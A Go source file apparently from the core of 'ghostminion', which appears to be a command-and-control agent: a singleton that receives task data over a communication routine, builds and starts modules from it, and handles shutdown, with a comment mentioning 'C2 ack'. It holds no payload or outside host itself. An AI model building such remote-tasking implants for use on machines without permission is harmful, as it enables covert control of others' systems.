package core

import (
	"context"
	"fmt"
	"ghostminion/apps"
	"ghostminion/communication"
	"ghostminion/logger"
	"sync"
)

var (
	lgr      = logger.GetInstance()
	instance *Core
	once     sync.Once
)

func GetInstance() *Core {
	once.Do(func() {
		instance = NewCore()
	})
	return instance
}

type Core struct {
	cancelReason chan string
	ctx          context.Context
	cancel       context.CancelFunc
	wg           sync.WaitGroup
	am           *apps.AppManager
	commTaskCh   chan apps.AppData
}

// NewCore creates a Core that owns the cancellation context and WaitGroup.
func NewCore() *Core {
	ctx, cancel := context.WithCancel(context.Background())
	return &Core{
		cancelReason: make(chan string, 1),
		ctx:          ctx,
		cancel:       cancel,
		am:           apps.NewAppManager(),
		commTaskCh:   make(chan apps.AppData, 100),
	}
}

func (c *Core) AppsManager() *apps.AppManager {
	return c.am
}

func (c *Core) Context() context.Context {
	return c.ctx
}

// Start starts all registered am and blocks until a shutdown reason or external cancel.
// After shut down is triggered, it waits for all am to finish.
func (c *Core) Start() {
	// Start all apps under core context
	c.am.StartAll(c.ctx, &c.wg)

	// Start communication routine
	c.StartCommunicationRoutine()

	select {
	case msg := <-c.cancelReason:
		lgr.Info(fmt.Sprintf("[core] shutdown requested: %s", msg))
		c.Shutdown(msg)
	case <-c.ctx.Done():
		lgr.Info("[core] context canceled externally")
		c.am.StopAll()
		close(c.commTaskCh)
	}

	// Wait for all goroutines to finish
	c.wg.Wait()
	lgr.Info("[core] all modules stopped, core exiting")
}

func (c *Core) StartCommunicationRoutine() {
	c.wg.Add(1)
	go func() {
		defer c.wg.Done()
		for task := range c.commTaskCh {
			app, err := apps.NewAppFactory(task)
			if err != nil {
				lgr.Error(err.Error())
			}
			c.am.Register(app)
			c.am.StartApp(task.Name, c.ctx, &c.wg)
		}
	}()

	c.wg.Add(1)
	go func() {
		defer c.wg.Done()
		communication.Routine(c.ctx, c.commTaskCh)
	}()
}

// Shutdown triggers a global shutdown. It's important.
func (c *Core) Shutdown(reason string) {
	// log early (useful for C2 ack before we cancel)
	lgr.Warn(reason)

	// cancel context (idempotent)
	c.cancel()

	// ask am to stop (non-blocking). The actual goroutines will return and the wg will be released.
	c.am.StopAll()
	close(c.commTaskCh)
}

// TriggerShutdown sends a shutdown message into the core's channel (non-blocking).
// Useful for modules that only know about Core via GetInstance.
func (c *Core) TriggerShutdown(reason string) {
	select {
	case c.cancelReason <- reason:
	default:
		// channel full or already signaled; fallback to direct shutdown
		c.Shutdown(reason)
	}
}
